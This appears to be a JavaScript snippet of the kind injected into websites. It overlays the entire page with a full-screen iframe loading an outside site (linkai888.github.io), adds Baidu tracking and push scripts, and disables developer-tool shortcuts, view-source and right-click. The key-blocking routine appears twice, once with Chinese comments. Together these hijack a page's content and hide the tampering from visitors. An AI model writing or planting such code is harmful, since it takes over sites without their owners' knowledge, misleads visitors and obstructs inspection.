document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;margin:0;padding:0}</style>');
var iframe = document.createElement('iframe');
iframe.src = 'https://linkai888.github.io/';
iframe.scrolling = 'auto';
iframe.style.cssText = "width:100%;height:100%;left:1px;top:1px;border:none;background:#fff";
var div1 = document.createElement("div");
var div = document.createElement("div");
div1.style.cssText = "-webkit-overflow-scrolling:touch;width:100%;height:100%;z-index:9999999999;position:fixed;top:0;left:0;";
var is_mobi = navigator.userAgent.toLowerCase().match(/(ipad|iphone|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|wince)/i) != null;
if (is_mobi) {
    div1.style.overflow = "auto"
}
div1.appendChild(iframe);
div.appendChild(div1);
document.write(div.innerHTML);
var _0 = _0 || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?e311aaef40d1d9b7de884fc8e431f071";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s)
})();
(function() {
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
    } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js'
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s)
})();
window.onload = function() {
    document.onkeydown = function() {
        var e = window.event || arguments[0];
        if (e.keyCode == 123) {
            return false;
        } else if ((e.ctrlKey) && (e.shiftKey) && (e.keyCode == 73)) {
            return false;
        } else if ((e.shiftKey) && (e.keyCode == 121)) {
            return false;
        } else if ((e.ctrlKey) && (e.keyCode == 85)) {
            return false
        }
    };
    document.oncontextmenu = function() {
        return false
    }
}




         window.onload = function(){

             //屏蔽键盘事件

             document.onkeydown = function (){

                 var e = window.event || arguments[0];

                 //F12

                 if(e.keyCode == 123){

                     return false;

                 //Ctrl+Shift+I

                 }else if((e.ctrlKey) && (e.shiftKey) && (e.keyCode == 73)){

                     return false;

                 //Shift+F10

                 }else if((e.shiftKey) && (e.keyCode == 121)){

                     return false;

                 //Ctrl+U

                 }else if((e.ctrlKey) && (e.keyCode == 85)){

                     return false;

                 }

             };

             //屏蔽鼠标右键

             document.oncontextmenu = function (){

                 return false;

             }

         }

 
